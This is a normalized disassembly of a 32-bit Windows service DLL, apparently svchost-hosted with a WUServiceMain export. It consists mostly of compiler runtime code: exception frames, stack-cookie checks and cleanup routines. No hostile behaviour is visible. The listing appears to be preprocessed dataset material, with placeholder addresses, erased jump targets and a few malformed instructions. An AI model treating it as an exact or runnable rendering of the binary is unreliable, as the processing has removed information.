lea edi [ edi + 0x2 ]
lea edi [ esi + 0x2 ]
leave
retn
mov al [ esi ]
xor [ edi ] al
lea edi [ edi + 0x1 ]
lea edi [ esi + 0x1 ]
sub_10014400
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call [ rw-data ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
test eax eax
js r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push esi
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov esi eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
pop esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
call [ GetErrorInfo@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
sub_10014482
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_100144b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call _CxxThrowException
sub_100144f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_10014530
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_10014580
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_10014571
push rw-data
call sub_100146b0
add esp 0x18
pop ebp
retn
sub_100145a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_100146b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ eax ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call [ ebp + 0xc ]
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] ecx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
push edi
mov ecx ebx
call sub_1001497b
jmp r-xdata
jmp r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
lea edx [ ebx + ebx * 2 ]
mov ecx [ esi + edx * 4 + 0x14 ]
lea eax [ esi + edx * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call [ ebp + 0xc ]
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10014932
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
call sub_10014962
mov eax [ ebp + 0x14 ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
push edi
mov edx ebx
mov ecx eax
call sub_1001497b
mov eax [ ebp + 0x14 ]
push rw-data
call sub_10014a30
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10014949
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push 0x1
push ecx
call [ rw-data ]
add esp 0x8
sub_10014840
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_100148d0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10014c05
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10014c24
jmp r-xdata
sub_100148d0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10014571
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10014840
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10014932
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10014962
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100149a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_100149e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10014a30
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10014580
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_100149a0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100149e0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10014af0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10014b10
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10014571
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10014b55
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10014b55
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10014b10
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10014c05
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10014c24
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10014c05
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10014c34
push ebx
mov bl [ esp + 0x8 ]
test bl 0x2
push esi
mov esi ecx
je r-xdata
mov ecx esi
call ??1type_info@@UAE@XZ
test bl 0x1
je r-xdata
push edi
push ??1type_info@@UAE@XZ
lea edi [ esi - 0x4 ]
push [ edi ]
push 0xc
push esi
call sub_10014e6a
test bl 0x1
je r-xdata
mov eax esi
push esi
call ??3@YAXPAX@Z
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call operator delete
pop ecx
pop esi
pop ebx
retn 0x4
sub_10014c86
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x1
mov ecx [ _adjust_fdiv@IAT ]
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
xor eax eax
inc eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push r--data
push r--data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
jmp r-xdata
retn 0xc
jmp r-xdata
pop ecx
sub [ rw-data ] 0x4
cmp [ rw-data ] eax
jae r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
call ecx
mov eax [ rw-data ]
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
test esi esi
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10014c86
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10013b15
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10014c86
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10014c86
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10014e0c
push 0x14
push r--data
call sub_10014f24
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_10014f5d
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_10014e3b
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
int3
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_10014e6a
push 0xc
push r--data
call sub_10014f24
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_10014eb2
call sub_10014f5d
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_10014ee0
cmp eax 0x1000
jae r-xdata
push ecx
lea ecx [ esp + 0x8 ]
neg eax
add eax esp
add eax 0x4
test [ eax ] eax
xchg esp eax
mov eax [ eax ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub_10014f24
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
retn
sub_10014f80
push sub_10014580
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10014fe0
push sub_10014580
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10015050
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10015102
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10015135
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100014b3
lea eax [ esi + 0x19038 ]
push eax
call [ DeleteCriticalSection@IAT ]
push [ esi + 0x19050 ]
call [ CloseHandle@IAT ]
lea ecx [ esi + 0x19008 ]
jmp sub_10003114
sub_100015ed
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x320b0 ] 0x0
push eax
je r-xdata
call sub_10001e8e
call sub_10002294
jmp r-xdata
push eax
call [ ExitThread@IAT ]
sub_10001786
push ebx
mov ebx ecx
push esi
mov [ ebx ] r--data
call sub_10001a39
lea esi [ ebx + 0x19060 ]
call sub_100015a1
lea esi [ ebx + 0xc ]
call sub_100014b3
pop esi
pop ebx
retn
sub_10001850
mov eax [ ecx + 0x320ac ]
retn
sub_10003113
retn
sub_10003802
mov [ ecx ] r--data
retn
sub_10003809
mov al 0x1
retn
sub_10003836
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call [ free@IAT ]
pop ecx
sub_100045e2
xor eax eax
inc eax
retn
sub_10005663
xor eax eax
inc eax
retn
sub_10008ef6
xor eax eax
inc eax
retn
sub_10008f6f
push esi
mov esi ecx
mov eax esi
mov [ esi ] r--data
call sub_10009032
mov eax esi
pop esi
jmp sub_1000904f
sub_10009097
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_10009614
push eax
call [ ExitThread@IAT ]
sub_100091b9
lea eax [ esi + 0x2054 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x202c ]
call sub_1000a06f
lea ecx [ esi + 0x2004 ]
jmp sub_1000a06f
sub_100091dc
lea eax [ esi + 0x3058 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x2c ]
call sub_1000a06f
lea ecx [ esi + 0x4 ]
jmp sub_1000a06f
sub_1000a051
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ InitializeCriticalSection@IAT ]
xor eax eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov eax esi
retn
sub_1000adf6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ free@IAT ]
pop ecx
pop ebp
retn 0x4
sub_1000c2fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x220 ]
call sub_1000a2dc
pop esi
pop ebp
retn 0x4
sub_1000cf48
push ebp
mov ebp esp
mov ecx [ ecx + 0x224 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x28 ]
sub_1000cf9f
push [ ecx + 0x224 ]
call sub_1000a19c
retn
sub_1000d053
cmp [ ecx + 0x4 ] 0x5
jne r-xdata
mov eax [ ecx + 0x224 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx + 0x228 ]
jmp r-xdata
mov eax [ eax + 0x10c ]
retn
sub_1000d074
cmp [ ecx + 0x4 ] 0x5
jne r-xdata
mov eax [ ecx + 0x224 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x228 ]
jmp r-xdata
mov eax [ eax + 0x10c ]
retn
sub_1000d0eb
push esi
mov esi ecx
mov eax [ esi + 0x220 ]
call sub_10009032
mov eax [ esi + 0x224 ]
call sub_10009032
mov eax [ esi + 0x228 ]
pop esi
jmp sub_10009032
sub_1000f993
xor eax eax
inc eax
retn
sub_100105cb
xor eax eax
inc eax
retn
sub_100106c1
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_10010950
push ebp
mov ebp esp
call [ RevertToSelf@IAT ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ UnloadUserProfile@IAT ]
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
pop ebp
retn
sub_10011824
cmp [ ecx + 0x4 ] 0x7
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
jmp [ eax + 0x4 ]
mov ecx [ ecx + 0xc ]
mov eax [ ecx ]
jmp [ eax + 0x4 ]
sub_1001189e
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x7
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x1c ]
mov eax [ ecx + 0xc ]
pop ebp
jmp sub_10001ae7
sub_100118b9
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x7
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x20 ]
mov eax [ ecx + 0xc ]
pop ebp
jmp sub_10001b3d
sub_100118d4
push ebp
mov ebp esp
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x24 ]
sub_100118e0
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ecx [ esi + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
pop esi
retn
sub_100118f6
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x7
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x30 ]
mov ecx [ ecx + 0xc ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x14 ]
sub_10011911
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x7
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x34 ]
mov ecx [ ecx + 0xc ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x18 ]
sub_1001192c
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x7
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x38 ]
mov ecx [ ecx + 0xc ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x1c ]
SvchostPushServiceGlobals
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn 0x4
WUServiceMain
jmp ServiceMain
sub_10012b8a
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_100126a8
push 0x0
call [ ExitThread@IAT ]
sub_10012ca6
mov ecx rw-data
call sub_10011f52
push 0x8007
call [ SetErrorMode@IAT ]
jmp sub_10012b9e
sub_10013e51
retn
sub_10014330
push ebp
mov ebp esp
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor eax eax
[ edi ]
sete al
leave
retn
sub_100143e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x0
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_10014571
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_100145a5
retn
_crt_debugger_hook
and [ rw-data ] 0x0
retn
sub_10014916
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10014840
add esp 0xc
pop ebp
retn 0x4
sub_10014949
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10014c05
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1001497b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10014840
add esp 0xc
pop ebp
retn 0x8
sub_10014abb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10014bd9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10014b10
jne r-xdata
retn
